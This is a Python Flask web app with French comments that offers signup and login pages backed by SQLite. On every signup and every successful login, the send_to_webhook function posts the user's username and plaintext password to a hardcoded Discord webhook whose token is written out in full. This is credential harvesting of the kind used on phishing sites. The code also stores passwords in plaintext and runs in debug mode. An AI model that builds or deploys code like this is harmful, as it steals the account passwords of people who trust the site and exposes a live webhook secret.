from flask import Flask, request, render_template, redirect, url_for
import sqlite3
import requests

app = Flask(__name__)

DATABASE = 'database.db'
WEBHOOK_URL = 'https://discord.com/api/webhooks/1274665150162534490/MUBP58LekN4mxwqYYGZGAwwCOIF9A-u_7kOtZZBCUV8Vdm8l0nCvl3fgxatUNGO68xpN'  # Remplacez ceci par l'URL de votre webhook

def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    with conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS users (
                          id INTEGER PRIMARY KEY AUTOINCREMENT,
                          username TEXT NOT NULL UNIQUE,
                          password TEXT NOT NULL)''')
    conn.close()

def send_to_webhook(username, password, action):
    data = {
        "content": f"{action} - Utilisateur: {username}, Mot de passe: {password}"
    }
    response = requests.post(WEBHOOK_URL, json=data)
    if response.status_code != 204:
        print(f"Erreur lors de l'envoi au webhook: {response.status_code}")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        confirm_password = request.form['confirm_password']
        
        if password != confirm_password:
            return "Les mots de passe ne correspondent pas.", 400

        conn = get_db_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
            conn.commit()
            send_to_webhook(username, password, "Nouveau compte créé")
            return redirect(url_for('about'))
        except sqlite3.IntegrityError:
            return "Ce nom d'utilisateur existe déjà.", 400
        finally:
            conn.close()

    return render_template('signup.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        conn = get_db_connection()
        cursor = conn.cursor()
        user = cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password)).fetchone()
        
        if user:
            send_to_webhook(username, password, "Connexion réussie")
            return redirect(url_for('about'))
        else:
            return "Nom d'utilisateur ou mot de passe incorrect.", 400

    return render_template('index.html')

@app.route('/about')
def about():
    return render_template('about.html')  # Assure-toi que ce fichier HTML existe

if __name__ == '__main__':
    init_db()  # Initialise la base de données
    app.run(debug=True)
